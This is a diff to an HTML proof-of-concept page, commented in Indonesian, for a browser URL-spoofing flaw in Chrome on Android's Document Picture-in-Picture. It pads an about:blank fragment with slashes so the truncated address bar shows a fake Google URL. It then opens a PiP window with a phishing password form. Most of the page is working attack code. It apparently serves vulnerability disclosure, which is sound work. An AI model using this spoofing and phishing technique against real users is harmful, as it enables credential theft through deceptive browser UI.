@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Document PiP Header Spoof PoC</title>
+    <title>Document PiP Header Spoof (Android 16+ Only)</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <script>
@@ -12,22 +12,25 @@
                 step++;
 
                 if (step === 1) {
-                    // Klik pertama: buka popup about:blank dengan fragment yang berisi URL palsu
-                    // Inti kerentanan: host about:blank kosong, getUrlString() fallback ke seluruh spec
-                    // TruncateAt.START memotong awal, hanya menyisakan …https://www.google.com/
-                    const padding = '.?----'.repeat(900);
+                    // Klik pertama: buka popup about:blank dengan payload
+                    // Fragment berisi 300 garis miring + URL palsu, memanfaatkan fallback empty-host dan TruncateAt.START
+                    const padding = '/'.repeat(300);
                     const spoofedUrl = 'https://www.google.com/';
-                    const payload = padding + spoofedUrl;
-                    const popup = window.open('about:blank#' + payload, 'poc', 'width=400,height=400');
+                    const popup = window.open('about:blank#' + padding + spoofedUrl, 'poc', 'width=400,height=400');
 
-                    // Isi popup dengan tombol penipuan (menggunakan DOM API, jangan document.write, jika tidak URL akan di-reset)
+                    if (!popup) {
+                        document.body.innerHTML = '<h1 style="color:orange;">Popup diblokir, silakan izinkan popup</h1>';
+                        return;
+                    }
+
+                    // Gunakan DOM API untuk menulis tombol tipuan (jangan gunakan document.write, jika tidak URL akan di-reset)
                     popup.document.body.innerHTML = `
                         <h1 style="color:#333;">Verifikasi Keamanan</h1>
                         <p>Silakan ketuk untuk melanjutkan</p>
                         <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                     `;
 
-                    // Klik kedua terjadi di dalam popup
+                    // Klik kedua: terjadi di dalam popup, memicu Document PiP
                     popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                         try {
                             const pipWin = await documentPictureInPicture.requestWindow({
@@ -35,15 +38,16 @@
                                 height: 300
                             });
 
-                            // Menulis konten penipuan ke dalam jendela PiP
+                            // Tulis formulir phishing ke dalam jendela PiP
                             pipWin.document.body.innerHTML = `
                                 <h2 style="color:red;">Google</h2>
                                 <p>Verifikasi akun Anda</p>
-                                <input type="password" placeholder="Kata sandi" style="width:100%;">
-                                <button>Masuk</button>
+                                <input type="password" placeholder="Kata sandi" style="width:100%;margin:10px 0;">
+                                <button style="width:100%;">Masuk</button>
                             `;
                         } catch (e) {
-                            console.log('PiP gagal:', e.message);
+                            popup.document.body.innerHTML = 
+                                `<h1 style="color:gray;">PiP gagal: ${e.message}</h1>`;
                         }
                     });
                 }
@@ -56,6 +60,9 @@
     <center>
         <h1>Ketuk di mana saja untuk memulai (dua kali)</h1>
         <p style="color:#666;">Klik pertama: buka popup · Klik kedua: picu PiP</p>
+        <p style="color:#999;font-size:12px;">
+            Hanya untuk Chrome Android 16+ · Memerlukan mode desktop-windowing · Memerlukan flag chrome://flags#enable-android-document-picture-in-picture
+        </p>
     </center>
 </body>
 </html>
